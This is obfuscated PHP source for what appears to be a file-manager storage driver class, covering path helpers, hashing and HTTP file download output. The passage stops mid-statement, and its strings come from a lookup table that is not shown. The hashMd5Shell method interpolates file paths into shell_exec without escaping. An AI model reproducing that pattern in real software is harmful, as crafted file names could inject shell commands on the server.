<?php
 goto DÖ¿ˆªáâº; e··Æ„’ˆ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ĞÔ˜¤äá =& $_SERVER[ìïæ“œî]; $this->objectDriver = array($ĞÔ˜¤äá[60], $ĞÔ˜¤äá[61], $ĞÔ˜¤äá[62], $ĞÔ˜¤äá[63], $ĞÔ˜¤äá[64], $ĞÔ˜¤äá[65], $ĞÔ˜¤äá[66], $ĞÔ˜¤äá[67], $ĞÔ˜¤äá[68], $ĞÔ˜¤äá[69], $ĞÔ˜¤äá[70], $ĞÔ˜¤äá[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($„Ç±é›§) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($„Ç±é›§, $_SERVER[ìïæ“œî][8]); } return $„Ç±é›§; } public function iconvApp($ÆÄ—Õë©) { return $ÆÄ—Õë©; } public function iconvSystem($´´—¡¯Ô) { return $´´—¡¯Ô; } public function iconvTo($í¦¡ü´Ï, $ÌûÛ›œ›, $òÏ¢ÜÊ§) { $Ôá¾î÷ƒ =& $_SERVER[ìïæ“œî]; if (!$í¦¡ü´Ï || !function_exists($Ôá¾î÷ƒ[72])) { return $í¦¡ü´Ï; } static $ã«®òĞª = array(); $æúä€¥Å = $ÌûÛ›œ› . $Ôá¾î÷ƒ[73] . $òÏ¢ÜÊ§ . $Ôá¾î÷ƒ[74] . $í¦¡ü´Ï; if (isset($ã«®òĞª[$æúä€¥Å])) { return $ã«®òĞª[$æúä€¥Å]; } if (function_exists($Ôá¾î÷ƒ[75])) { $ÀïåŞç = @mb_convert_encoding($í¦¡ü´Ï, $òÏ¢ÜÊ§, $ÌûÛ›œ›); } else { $ÀïåŞç = @iconv($ÌûÛ›œ›, $òÏ¢ÜÊ§, $í¦¡ü´Ï); } $ÀïåŞç = $ÀïåŞç ? $ÀïåŞç : $í¦¡ü´Ï; if (strstr($ÀïåŞç, $Ôá¾î÷ƒ[76])) { $ÀïåŞç = str_replace($Ôá¾î÷ƒ[76], $Ôá¾î÷ƒ[11], $ÀïåŞç); } $ã«®òĞª[$ÌûÛ›œ› . $Ôá¾î÷ƒ[73] . $òÏ¢ÜÊ§ . $Ôá¾î÷ƒ[74] . $í¦¡ü´Ï] = $ÀïåŞç; $ã«®òĞª[$òÏ¢ÜÊ§ . $Ôá¾î÷ƒ[73] . $ÌûÛ›œ› . $Ôá¾î÷ƒ[74] . $í¦¡ü´Ï] = $í¦¡ü´Ï; $ã«®òĞª[$òÏ¢ÜÊ§ . $Ôá¾î÷ƒ[73] . $ÌûÛ›œ› . $Ôá¾î÷ƒ[74] . $ÀïåŞç] = $í¦¡ü´Ï; $ã«®òĞª[$ÌûÛ›œ› . $Ôá¾î÷ƒ[73] . $òÏ¢ÜÊ§ . $Ôá¾î÷ƒ[74] . $ÀïåŞç] = $ÀïåŞç; return $ÀïåŞç; } public function getPathInner($Ïø½É™§) { $ª³ÕµÊ™ = IO::init($Ïø½É™§); return $ª³ÕµÊ™->path; } public function getPathOuter($ÁÇ”ì‰¢) { $èÏ¤şÃ =& $_SERVER[ìïæ“œî]; $ÕŠ­úÂÛ = strlen(trim($this->pathBase, $èÏ¤şÃ[8])); $ÁÇ”ì‰¢ = substr(trim($ÁÇ”ì‰¢, $èÏ¤şÃ[8]), $ÕŠ­úÂÛ); return $this->pathDriver . $èÏ¤şÃ[8] . ltrim($ÁÇ”ì‰¢, $èÏ¤şÃ[8]); } public function isParentOf($½Ì‚ÀÙ, $ß°µ³òº) { $‚Ó¯ç =& $_SERVER[ìïæ“œî]; $½Ì‚ÀÙ = rtrim(strtolower($½Ì‚ÀÙ), $‚Ó¯ç[8]) . $‚Ó¯ç[8]; $ß°µ³òº = rtrim(strtolower($ß°µ³òº), $‚Ó¯ç[8]) . $‚Ó¯ç[8]; $®µ£©Õ = strpos($ß°µ³òº, $½Ì‚ÀÙ) === 0; return $®µ£©Õ; } public function getType() { $ûşŒù¬„ =& $_SERVER[ìïæ“œî]; $‚¢±¸åÛ = str_replace($ûşŒù¬„[77], $ûşŒù¬„[12], get_class($this)); return strtolower($‚¢±¸åÛ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ÿ¾ª®¡ˆ, $Ã§ÜµÄç) { $Ïõê¿ =& $_SERVER[ìïæ“œî]; $ô§éãáâ = rtrim($Ÿ¾ª®¡ˆ, $Ïõê¿[8]) . $Ïõê¿[8] . $Ã§ÜµÄç; $€å¡¯ğä = $this->exist($ô§éãáâ); return $€å¡¯ğä ? $ô§éãáâ : !1; } public function setModifyTime($–äÔ­­¿, $¨ŠöĞé = '') { } public function renameObject($±£ìÕé‡, $‹Å‹Îè) { $‹Ïë°ú« = $‹Å‹Îè; $±£ìÕé‡ = $this->getPathOuter($±£ìÕé‡); $‹Å‹Îè = $this->pathFather($±£ìÕé‡) . $‹Å‹Îè; $Û±Á¼ = IO::copy($±£ìÕé‡, $this->pathFather($±£ìÕé‡), REPEAT_RENAME_FOLDER, $‹Ïë°ú«); if ($Û±Á¼) { IO::remove($±£ìÕé‡); } return $Û±Á¼ ? $‹Å‹Îè : !1; } public function tempFile($š£œ°Å = '', $ªæ€¶¸Æ = '') { if (!$š£œ°Å) { $š£œ°Å = rand_string(15); } $¨æœ¬Âå = TEMP_FILES . rand_string(15) . $_SERVER[ìïæ“œî][8]; @mkdir($¨æœ¬Âå, DEFAULT_PERRMISSIONS, !0); $Ø¥Æñ£ = $¨æœ¬Âå . $š£œ°Å; @touch($Ø¥Æñ£); if ($ªæ€¶¸Æ) { file_put_contents($Ø¥Æñ£, $ªæ€¶¸Æ); } return $Ø¥Æñ£; } public function tempFileRemve($ŞÌÇÈ‡•) { @unlink($ŞÌÇÈ‡•); @rmdir($this->pathFather($ŞÌÇÈ‡•)); } public function mkfile($âÑäØ«‹, $ÔºÙ¯›á = '', $¶ã Ö = REPEAT_RENAME) { } public function mkdir($¼„®ì¹â, $Ä÷éÃ§İ = REPEAT_SKIP) { } public function delFile($å¤®—ìÈ) { } public function delFolder($¾à¥èƒû) { } public function copyFile($ÛÄôì±¹, $…»ï‹’) { } public function moveFile($®ãÙµ×, $ÑµÂÓ‘¥) { } public function remove($¶„ÅĞÊ©) { if ($this->isFile($¶„ÅĞÊ©)) { return $this->delFile($¶„ÅĞÊ©); } return $this->delFolder($¶„ÅĞÊ©); } public function rename($î“Éñ¢¥, $¯À¤¥èÌ) { } public function exist($ç¤ˆ¯´Û) { } public function findByHash($¶õ¦«·º = '', $ëÄ©ƒØ¾ = '') { return !1; } public function isFile($Û¼›¥µ³) { } public function isFolder($ò¹´µ¤) { } public function size($øÕıƒşï) { } public function info($ã¬ æ­¬) { } public function infoSimple($Ñ¯¾£àŸ) { return $this->info($Ñ¯¾£àŸ); } public function infoAuth($†äîÉ¸Ğ) { return $this->info($†äîÉ¸Ğ); } public function infoFull($ßóİ£) { return $this->info($ßóİ£); } public function infoFullSimple($‘î®Äë ) { return $this->info($‘î®Äë ); } public function infoWithChildren($æŸÁŸ×ê) { $õ˜¼€“ó =& $_SERVER[ìïæ“œî]; static $†à¢ö²¬ = array(); if (isset($†à¢ö²¬[$æŸÁŸ×ê])) { return $†à¢ö²¬[$æŸÁŸ×ê]; } $õçÌÅ«ä = $this->info($æŸÁŸ×ê); if ($õçÌÅ«ä && $õçÌÅ«ä[$õ˜¼€“ó[33]] == $õ˜¼€“ó[78]) { $áš÷ò’¼ = array($õ˜¼€“ó[79] => 0, $õ˜¼€“ó[80] => 0, $õ˜¼€“ó[81] => 0); $this->infoChildren($æŸÁŸ×ê, $áš÷ò’¼); $õçÌÅ«ä[$õ˜¼€“ó[79]] = $áš÷ò’¼[$õ˜¼€“ó[79]]; $õçÌÅ«ä[$õ˜¼€“ó[82]] = array($õ˜¼€“ó[83] => $áš÷ò’¼[$õ˜¼€“ó[80]], $õ˜¼€“ó[84] => $áš÷ò’¼[$õ˜¼€“ó[81]]); $†à¢ö²¬[$æŸÁŸ×ê] = $õçÌÅ«ä; } return $õçÌÅ«ä; } public function listPath($‡©»ÇÊß, $Ş—ôöµ = false) { } public function has($±ıÓ±¦õ, $Ê­™Çè = false, $û§ğªœ = false) { } public function canRead($ºÉÆ¿Ö”) { } public function canWrite($ƒÑ‰‘„ş) { } public function getContent($öÕ¾¾¦²) { } public function setContent($œ§¡üõ, $÷„çõÅ® = '') { } protected function infoChildren($‚•º˜ŸÍ, &$ßººÁÕ¦) { $Ôİ¢–…¦ =& $_SERVER[ìïæ“œî]; check_abort_echo(); $§ÆÕ™şá = $this->listPath($‚•º˜ŸÍ, !0); $§ÆÕ™şá = array_merge($§ÆÕ™şá[$Ôİ¢–…¦[85]], $§ÆÕ™şá[$Ôİ¢–…¦[86]]); foreach ($§ÆÕ™şá as $ä»æ‚àè) { if ($ä»æ‚àè[$Ôİ¢–…¦[33]] == $Ôİ¢–…¦[78]) { $ßººÁÕ¦[$Ôİ¢–…¦[81]]++; $Ë‡ÉÜ”¯ = $this->getPathInner($ä»æ‚àè[$Ôİ¢–…¦[87]]); $this->infoChildren($Ë‡ÉÜ”¯, $ßººÁÕ¦); } else { $ßººÁÕ¦[$Ôİ¢–…¦[80]]++; $ßººÁÕ¦[$Ôİ¢–…¦[79]] += $ä»æ‚àè[$Ôİ¢–…¦[79]]; } } } public function fileSubstr($Äß‹íÀç, $áï§Ëç—, $¯öÎñĞÊ) { } public function listAll($ªÁøáÁ) { } public function listAllMake($’¥ÓÏÄ, &$İ×ó»î¨) { $ûãËç· =& $_SERVER[ìïæ“œî]; check_abort_echo(); $ÜïœíÚ˜ = $this->listPath($’¥ÓÏÄ, !0); if (!$ÜïœíÚ˜) { return; } $¹Ôïüö± = array_merge($ÜïœíÚ˜[$ûãËç·[85]], $ÜïœíÚ˜[$ûãËç·[86]]); foreach ($¹Ôïüö± as $°İÒ—‚Æ) { $Ş…¢¯Øî = $°İÒ—‚Æ[$ûãËç·[33]] == $ûãËç·[78]; $ÏÜÇÏ³ì = array($ûãËç·[87] => $°İÒ—‚Æ[$ûãËç·[87]], $ûãËç·[78] => $Ş…¢¯Øî); if (isset($°İÒ—‚Æ[$ûãËç·[79]])) { $ÏÜÇÏ³ì[$ûãËç·[79]] = $°İÒ—‚Æ[$ûãËç·[79]]; } if (isset($°İÒ—‚Æ[$ûãËç·[88]])) { $ÏÜÇÏ³ì[$ûãËç·[88]] = $°İÒ—‚Æ[$ûãËç·[88]]; } if (!$Ş…¢¯Øî) { $İ×ó»î¨[] = $ÏÜÇÏ³ì; continue; } $İ×ó»î¨[] = $ÏÜÇÏ³ì; $×ºß’É¨ = $°İÒ—‚Æ[$ûãËç·[87]]; $Ä—¨‘»ú = $this->pathDriver; if (substr($°İÒ—‚Æ[$ûãËç·[87]], 0, strlen($Ä—¨‘»ú)) == $Ä—¨‘»ú) { $×ºß’É¨ = substr($×ºß’É¨, strlen($Ä—¨‘»ú)); } $this->listAllMake($×ºß’É¨, $İ×ó»î¨); } } public function listAllSimple($ıÀŒü±, $¸úÄø¼ = false) { $ĞÄ¯æªõ = $this->listAll($ıÀŒü±); return $this->listAllSimpleMake($ĞÄ¯æªõ, $this->getPathOuter($ıÀŒü±), $¸úÄø¼); } public function listAllSimpleMake($ÇãËŞÒ§, $§¡ ”óÍ, $Â°†¥•›) { $™Ê€íå =& $_SERVER[ìïæ“œî]; $¥¼„ê† = array(); $§¡ ”óÍ = rtrim(get_path_father($§¡ ”óÍ), $™Ê€íå[8]) . $™Ê€íå[8]; foreach ($ÇãËŞÒ§ as $™›î«î) { $èƒ¶œ¾ = array($™Ê€íå[87] => $™›î«î[$™Ê€íå[87]], $™Ê€íå[89] => $™›î«î[$™Ê€íå[87]], $™Ê€íå[78] => $™›î«î[$™Ê€íå[78]]); if (isset($™›î«î[$™Ê€íå[79]]) && !$™›î«î[$™Ê€íå[78]]) { $èƒ¶œ¾[$™Ê€íå[79]] = $™›î«î[$™Ê€íå[79]]; } if (isset($™›î«î[$™Ê€íå[88]])) { $èƒ¶œ¾[$™Ê€íå[88]] = $™›î«î[$™Ê€íå[88]]; } if (is_array($™›î«î[$™Ê€íå[90]])) { $èƒ¶œ¾[$™Ê€íå[89]] = $™›î«î[$™Ê€íå[90]][$™Ê€íå[87]]; $èƒ¶œ¾[$™Ê€íå[79]] = $™›î«î[$™Ê€íå[90]][$™Ê€íå[79]]; $èƒ¶œ¾[$™Ê€íå[88]] = $™›î«î[$™Ê€íå[90]][$™Ê€íå[88]]; } else { if (substr($™›î«î[$™Ê€íå[87]], 0, strlen($§¡ ”óÍ)) == $§¡ ”óÍ) { $èƒ¶œ¾[$™Ê€íå[87]] = substr($™›î«î[$™Ê€íå[87]], strlen($§¡ ”óÍ)); } } $û´Ú¯şê = $™›î«î[$™Ê€íå[78]] ? $™Ê€íå[8] : $™Ê€íå[12]; $èƒ¶œ¾[$™Ê€íå[89]] = rtrim($èƒ¶œ¾[$™Ê€íå[89]], $™Ê€íå[8]) . $û´Ú¯şê; $èƒ¶œ¾[$™Ê€íå[87]] = $™Ê€íå[8] . trim($èƒ¶œ¾[$™Ê€íå[87]], $™Ê€íå[8]) . $û´Ú¯şê; if (!$Â°†¥•›) { $Öúü‘ñ‰ = explode($™Ê€íå[8], trim($èƒ¶œ¾[$™Ê€íå[87]], $™Ê€íå[8])); $èƒ¶œ¾[$™Ê€íå[87]] = $™Ê€íå[8] . implode($™Ê€íå[8], array_slice($Öúü‘ñ‰, 1)) . $û´Ú¯şê; } $¥¼„ê†[] = $èƒ¶œ¾; } return array_sort_by($¥¼„ê†, $™Ê€íå[87]); } public function upload($ßÔÎ®Èª, $éá‚˜Êë, $ĞÕî³ = false, $ÃÉôáÄé = REPEAT_REPLACE) { } public function uploadFileByID($‹ì»ü, $’Œø¬Àñ, $×€Å‰®) { } public function uploadFileByPath($ó™ß“Ñ’, $ñîšŸòÏ, $ÇÎ”¦ˆ = array()) { } public function isUploadServer() { $ØŞ¨Œ¡Ş =& $_SERVER[ìïæ“œî]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ØŞ¨Œ¡Ş[91]) { return !0; } return $GLOBALS[$ØŞ¨Œ¡Ş[6]][$ØŞ¨Œ¡Ş[92]][$ØŞ¨Œ¡Ş[93]]; } public function isFileOutServer() { $î¼·ë¦ù =& $_SERVER[ìïæ“œî]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $î¼·ë¦ù[91]) { return !0; } return $GLOBALS[$î¼·ë¦ù[6]][$î¼·ë¦ù[92]][$î¼·ë¦ù[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($‘×”Ú‡Ö) { $Ê¶ÔÕª =& $_SERVER[ìïæ“œî]; if (!$this->isCdnHost()) { return $‘×”Ú‡Ö; } return str_replace(trim(get_url_root($‘×”Ú‡Ö), $Ê¶ÔÕª[8]), trim($this->cdnHost, $Ê¶ÔÕª[8]), $‘×”Ú‡Ö); } public function uploadLink($‘÷šï¾³, $šŸÚÛ  = 0) { $ŠÇÒ¶˜ =& $_SERVER[ìïæ“œî]; if ($this->isUploadServer()) { return; } $ØÄ®›ÈÑ = $this->getType(); if (!in_array($ØÄ®›ÈÑ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $—ûº„×› = 1024 * 1024 * 10; $ŸÙ‡”ø… = $šŸÚÛ  <= $—ûº„×› ? $ŠÇÒ¶˜[95] : $ŠÇÒ¶˜[96]; $„ààãÂµ = (!$šŸÚÛ  ? 1 : ceil($šŸÚÛ  / pow(1024, 3))) * 3600 * 4; $Ù£ªÈ— = $this->{$ŸÙ‡”ø…}($‘÷šï¾³, $„ààãÂµ); if ($Ù£ªÈ—) { $Ù£ªÈ—[$ŠÇÒ¶˜[97]] = $‘÷šï¾³; $Ù£ªÈ—[$ŠÇÒ¶˜[98]] = $ØÄ®›ÈÑ; } return $Ù£ªÈ—; } public function uploadFormData($Óˆ¤›Ğ‚, $©ì¡®¼ = 3600) { } public function multiUploadFormData($¢ÅÒ’¬Ş, $àİù—Èş = 3600) { } public function download($Õñ¬¾€¥, $•Ÿ­ª÷) { } public function ext($ÕæËÜìˆ) { $ÖİëÕÂØ =& $_SERVER[ìïæ“œî]; if (strpos($ÕæËÜìˆ, $ÖİëÕÂØ[8]) === -1) { $º×ÍÅÌÍ = $ÕæËÜìˆ; } else { $º×ÍÅÌÍ = $this->pathThis($ÕæËÜìˆ); } $Ò¶šÕ‰ª = $ÖİëÕÂØ[12]; if (strstr($º×ÍÅÌÍ, $ÖİëÕÂØ[10])) { $Ò¶šÕ‰ª = substr($º×ÍÅÌÍ, strrpos($º×ÍÅÌÍ, $ÖİëÕÂØ[10]) + 1); $Ò¶šÕ‰ª = strtolower($Ò¶šÕ‰ª); } if (strlen($Ò¶šÕ‰ª) > 3 && preg_match($ÖİëÕÂØ[99], $Ò¶šÕ‰ª, $¶¶òù€Ü)) { $Ò¶šÕ‰ª = $ÖİëÕÂØ[12]; } return $Ò¶šÕ‰ª; } public function pathThis($èÀçË²õ) { $ÚŞ“ºÃµ =& $_SERVER[ìïæ“œî]; $èÀçË²õ = str_replace($ÚŞ“ºÃµ[100], $ÚŞ“ºÃµ[8], rtrim($èÀçË²õ, $ÚŞ“ºÃµ[8])); $òÑ»ùÏ¸ = strrpos($èÀçË²õ, $ÚŞ“ºÃµ[8]); if ($òÑ»ùÏ¸ === !1) { return $èÀçË²õ; } return substr($èÀçË²õ, $òÑ»ùÏ¸ + 1); } public function pathFather($·äõõÛ‘) { $Èá°¹›ï =& $_SERVER[ìïæ“œî]; $·äõõÛ‘ = str_replace($Èá°¹›ï[100], $Èá°¹›ï[8], rtrim($·äõõÛ‘, $Èá°¹›ï[8])); $‚ é¬¼à = strrpos($·äõõÛ‘, $Èá°¹›ï[8]); if ($‚ é¬¼à === !1) { return $Èá°¹›ï[12]; } return substr($·äõõÛ‘, 0, $‚ é¬¼à + 1); } public function hashSimple($üõ™£¨) { $Ÿ†ƒş– =& $_SERVER[ìïæ“œî]; if (!$üõ™£¨) { return md5($Ÿ†ƒş–[12]); } $­Ÿ’İ ö = $this->size($üõ™£¨); $×Ù‰ĞÄ = 200; $¼ÛØ ¹ = 50; if ($­Ÿ’İ ö <= $×Ù‰ĞÄ * $¼ÛØ ¹) { return $this->hashMd5($üõ™£¨) . $­Ÿ’İ ö; } $ÏñŸ¡êÄ = intval($­Ÿ’İ ö / $¼ÛØ ¹); $æ–Øí÷œ = $Ÿ†ƒş–[12]; for ($¡Ë†— = 0; $¡Ë†— < $¼ÛØ ¹; $¡Ë†—++) { $æ–Øí÷œ .= $this->fileSubstr($üõ™£¨, $ÏñŸ¡êÄ * $¡Ë†—, $×Ù‰ĞÄ); } $æ–Øí÷œ .= $this->fileSubstr($üõ™£¨, $­Ÿ’İ ö - $×Ù‰ĞÄ, $×Ù‰ĞÄ); return md5($æ–Øí÷œ) . $­Ÿ’İ ö; } public static $md5Cache = array(); public function hashMd5($İ ÕÊ§º) { if (!$İ ÕÊ§º) { return md5($_SERVER[ìïæ“œî][12]); } $İ ÕÊ§º = $this->iconvSystem($İ ÕÊ§º); if (isset(self::$md5Cache[$İ ÕÊ§º])) { return self::$md5Cache[$İ ÕÊ§º]; } self::$md5Cache[$İ ÕÊ§º] = $this->hashMd5Shell($İ ÕÊ§º); if (!self::$md5Cache[$İ ÕÊ§º]) { self::$md5Cache[$İ ÕÊ§º] = @md5_file($İ ÕÊ§º); } return self::$md5Cache[$İ ÕÊ§º]; } private function hashMd5Shell($¯ä»­¡±) { $Èçğ†ŒÕ =& $_SERVER[ìïæ“œî]; if (!$¯ä»­¡±) { return md5($Èçğ†ŒÕ[12]); } if (!function_exists($Èçğ†ŒÕ[101])) { return !1; } $‹ÑùÁ« = array($Èçğ†ŒÕ[102], $Èçğ†ŒÕ[103]); $‡Á½„ª“ = Cache::get($Èçğ†ŒÕ[104]); if (!$‡Á½„ª“) { $çñ¤°ıà = BASIC_PATH . $Èçğ†ŒÕ[105]; $Õ¹ˆºÖõ = md5_file($çñ¤°ıà); $‡Á½„ª“ = $Èçğ†ŒÕ[106]; foreach ($‹ÑùÁ« as $•›äĞ¸) { $Í’šùœ = shell_exec($•›äĞ¸ . "\x20\x22{$çñ¤°ıà}\42"); if ($Í’šùœ && substr(trim($Í’šùœ), 0, 32) == $Õ¹ˆºÖõ) { $‡Á½„ª“ = $•›äĞ¸; break; } } Cache::set($Èçğ†ŒÕ[104], $‡Á½„ª“, 3600); } if ($‡Á½„ª“ == $Èçğ†ŒÕ[106]) { return !1; } $Í’šùœ = shell_exec($‡Á½„ª“ . "\x20\42{$¯ä»­¡±}\42"); $Í’šùœ = str_replace($Èçğ†ŒÕ[107], $Èçğ†ŒÕ[12], $Í’šùœ); return substr($Í’šùœ, 0, 32); } public function link($Î§íÔ®½) { return $Î§íÔ®½; } public function fileOut($¾“İé¤§, $ƒŞÏÕ’§ = false, $˜İÅ® = false, $÷°ÓÏ±Û = '') { $Âáñ‡Ú• =& $_SERVER[ìïæ“œî]; $this->cacheMethod(null, null); if (!$¾“İé¤§ || !$this->exist($¾“İé¤§)) { show_json(LNG($Âáñ‡Ú•[108]), !1, $˜İÅ®); } $ãÖ¤ŸÃ­ = $this->getType() == $Âáñ‡Ú•[109]; $ÌÌ¨ÒÄ = $GLOBALS[$Âáñ‡Ú•[6]][$Âáñ‡Ú•[92]][$Âáñ‡Ú•[110]][$Âáñ‡Ú•[111]]; $ÀûÈÉÒ¸ = (double) $GLOBALS[$Âáñ‡Ú•[6]][$Âáñ‡Ú•[92]][$Âáñ‡Ú•[110]][$Âáñ‡Ú•[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¾£¦Í´ = $this->infoFull($¾“İé¤§); $ßèŞŸ¼æ = $¾£¦Í´[$Âáñ‡Ú•[79]]; $ÆŒ´Ö›û = gmdate($Âáñ‡Ú•[113], $¾£¦Í´[$Âáñ‡Ú•[88]]); $‚êıéø = $˜İÅ® ? $˜İÅ® : $this->iconvApp($¾£¦Í´[$Âáñ‡Ú•[32]]); $ë÷‚™ = 0; $À¿øí° = $ßèŞŸ¼æ - 1; $”œ÷ÓĞİ = $this->ext($‚êıéø); if (in_array($”œ÷ÓĞİ, array($Âáñ‡Ú•[114], $Âáñ‡Ú•[115], $Âáñ‡Ú•[116], $Âáñ‡Ú•[117]))) { $”œ÷ÓĞİ = $Âáñ‡Ú•[118]; } if (in_array($”œ÷ÓĞİ, array($Âáñ‡Ú•[119]))) { $”œ÷ÓĞİ = $Âáñ‡Ú•[120]; } if (!$÷°ÓÏ±Û) { $÷°ÓÏ±Û = md5($ÆŒ´Ö›û . $ßèŞŸ¼æ); } $÷°ÓÏ±Û = $Âáñ‡Ú•[121] . $÷°ÓÏ±Û . $Âáñ‡Ú•[121]; $”îüôÄ¨ = get_file_mime($”œ÷ÓĞİ); $¨éîßØ¾ = !0; $¨éîßØ¾ = isset($_GET[$Âáñ‡Ú•[122]]) ? !1 : !0; if ($ƒŞÏÕ’§ === !1 && !mime_support($”îüôÄ¨)) { $”îüôÄ¨ = $Âáñ‡Ú•[123]; } header($Âáñ‡Ú•[124]); header($Âáñ‡Ú•[125] . $”îüôÄ¨); $ÏŞÄéò = rawurlencode($‚êıéø); $ÏŞÄéò = $Âáñ‡Ú•[121] . $ÏŞÄéò . $Âáñ‡Ú•[126] . $ÏŞÄéò; if ($ƒŞÏÕ’§) { header($Âáñ‡Ú•[127]); header($Âáñ‡Ú•[128] . $ÏŞÄéò); } else { if ($¨éîßØ¾) { header($Âáñ‡Ú•[129] . $ÏŞÄéò); } } $í¶ıŠÀ£ = 3600 * 24 * 30; header($Âáñ‡Ú•[130]); header($Âáñ‡Ú•[131]); header($Âáñ‡Ú•[132] . $í¶ıŠÀ£); header($Âáñ‡Ú•[133] . gmdate($Âáñ‡Ú•[113], time() + $í¶ıŠÀ£) . $Âáñ‡Ú•[134]); if (isset($_SERVER[$Âáñ‡Ú•[135]]) && strtotime($_SERVER[$Âáñ‡Ú•[135]]) == $¾£¦Í´[$Âáñ‡Ú•[88]]) { header($Âáñ‡Ú•[136], !0, 304); die; } if (isset($_SERVER[$Âáñ‡Ú•[137]]) && $_SERVER[$Âáñ‡Ú•[137]] == $÷°ÓÏ±Û) { header($Âáñ‡Ú•[138] . $÷°ÓÏ±Û, !0, 304); die; } header($Âáñ‡Ú•[138] . $÷°ÓÏ±Û); header($Âáñ‡Ú•[139] . $ÆŒ´Ö›û . $Âáñ‡Ú•[134]); header($Âáñ‡Ú•[140] . $‚êıéø); header($Âáñ‡Ú•[141]); header($Âáñ‡Ú•[142] . $ßèŞŸ¼æ); header($Âáñ‡Ú•[143]); Hook::trigger($Âáñ‡Ú•[144], $¾“İé¤§, $ßèŞŸ¼æ, $‚êıéø, $”œ÷ÓĞİ); if (!$ƒŞÏÕ’§ && $”œ÷ÓĞİ == $Âáñ‡Ú•[145]) { if ($ßèŞŸ¼æ > 1024 * 1024 * 5) { die; } $ë›šá = $this->getContent($¾“İé¤§); $ë›šá = Html::clearSVG($ë›šá); header($Âáñ‡Ú•[146] . strlen($ë›šá)); echo $ë›šá; die; } $Ú×ŸÇø÷ = strtolower($_SERVER[$Âáñ‡Ú•[147]]); if ($ãÖ¤ŸÃ­ && $Ú×ŸÇø÷ && $ÌÌ¨ÒÄ) { if (strstr($Ú×ŸÇø÷, $Âáñ‡Ú•[148])) { header($Âáñ‡Ú•[149] . $¾“İé¤§); } else { if (strstr($Ú×ŸÇø÷, $Âáñ‡Ú•[150])) { header($Âáñ‡Ú•[151] . $¾“İé¤§); } else { if (strstr($Ú×ŸÇø÷, $Âáñ‡Ú•[152])) { header($Âáñ‡Ú•[153] . $¾“İé¤§); } } } if ($ÀûÈÉÒ¸) { header($Âáñ‡Ú•[154] . $ÀûÈÉÒ¸); } return; } if (isset($_SERVER[$Âáñ‡Ú•[155]])) { if (preg_match($Âáñ‡Ú•[156], $_SERVER[$Âáñ‡Ú•[155]], $Òº­Êê¤)) { $ë÷‚™ = intval($Òº­Êê¤[1]); $ë÷‚™ = $ë÷‚™ <= 0 ? 0 : ($ë÷‚™ >= $À¿øí° ? $À¿øí° : $ë÷‚™); if (!empty($Òº­Êê¤[2])) { $Ïéş½„ = intval($Òº­Êê¤[2]); $À¿øí° = $Ïéş½„ < $ë÷‚™ ? $ë÷‚™ : ($Ïéş½„ >= $À¿øí° ? $À¿øí° : $Ïéş½„); } } header($Âáñ‡Ú•[157]); header("\103\157\x6e\164\x65\x6e\x74\55\x52\x61\x6e\x67\145\x3a\40\142\x79\x74\145\x73\x20{$ë÷‚™}\55{$À¿øí°}\57" . $ßèŞŸ¼æ); } else { header($Âáñ‡Ú•[158]); } header($Âáñ‡Ú•[159]); header($Âáñ‡Ú•[160]); $ù¥šŞÊê = !0; if ($_SERVER[$Âáñ‡Ú•[161]] == $Âáñ‡Ú•[162] && $ßèŞŸ¼æ > 1204 * 1024 * 1024 * 2) { $ù¥šŞÊê = !1; } if ($ù¥šŞÊê) { header($Âáñ‡Ú•[163] . ($À¿øí° - $ë÷‚™ + 1)); } if ($_SERVER[$Âáñ‡Ú•[164]] == $Âáñ‡Ú•[165]) { return; } $œá‡ª— = array($Âáñ‡Ú•[166] => !1, $Âáñ‡Ú•[167] => $ë÷‚™, $Âáñ‡Ú•[168] => $À¿øí°, $Âáñ‡Ú•[169] => $”œ÷ÓĞİ, $Âáñ‡Ú•[170] => $¾£¦Í´, $Âáñ‡Ú•[171] => $Âáñ‡Ú•[12], $Âáñ‡Ú•[172] => 0); $œá‡ª— = Hook::filter($Âáñ‡Ú•[173], $œá‡ª—); $î°ŸöÍ’ = 1024 * 300; $ÕÏ¾±™¶ = 0; if ($ÀûÈÉÒ¸) { $ÕÏ¾±™¶ = intval(1000 * 1000 * ($î°ŸöÍ’ / $ÀûÈÉÒ¸)); } while ($ë÷‚™ <= $À¿øí°) { $êÏÛÈÇ€ = timeFloat(); check_abort(); $ñì®¤î = $À¿øí° - $ë÷‚™ + 1; if ($ñì®¤î <= $î°ŸöÍ’) { $î°ŸöÍ’ = $ñì®¤î; } $ë›šá = $this->fileSubstr($¾“İé¤§, $ë÷‚™, $î°ŸöÍ’); if ($œá‡ª—[$Âáñ‡Ú•[166]]) { $œá‡ª—[$Âáñ‡Ú•[171]] = $ë›šá; $œá‡ª—[$Âáñ‡Ú•[172]] = $ë÷‚™; $œá‡ª— = Hook::filter($Âáñ‡Ú•[174], $œá‡ª—); $ë›šá = $œá‡ª—[$Âáñ‡Ú•[171]]; } echo $ë›šá; $ë÷‚™ += $î°ŸöÍ’; if ($î°ŸöÍ’ == $ñì®¤î) { $ë÷‚™ = $À¿øí° + 1; } if ($ÕÏ¾±™¶) { $ˆÀÖ®ó¯ = intval(1000 * 1000 * (timeFloat() - $êÏÛÈÇ€)); $ˆ–ª®éÓ = $ÕÏ¾±™¶ - $ˆÀÖ®ó¯; if ($ˆ–ª®éÓ > 5) { usleep($ˆ–ª®éÓ); } } } } public function fileOutServer($¢û‹¯çÙ, $Ÿ–˜ñ‘Í = false, $°æÂĞ½Ë = false, $öå™¡ŞÑ = '') { $this->fileOut($¢û‹¯çÙ, $Ÿ–˜ñ‘Í, $°æÂĞ½Ë, $öå™¡ŞÑ); } public function fileOutLink($äéŠÍ•) { header($_SERVER[ìïæ“œî][175] . $äéŠÍ•); die; } public function cacheMethod($¡Õ­÷ç’, $ÃÂ‰¼¯„, $ºÈ’´óµ = null) { $Şòä­† =& $_SERVER[ìïæ“œî]; static 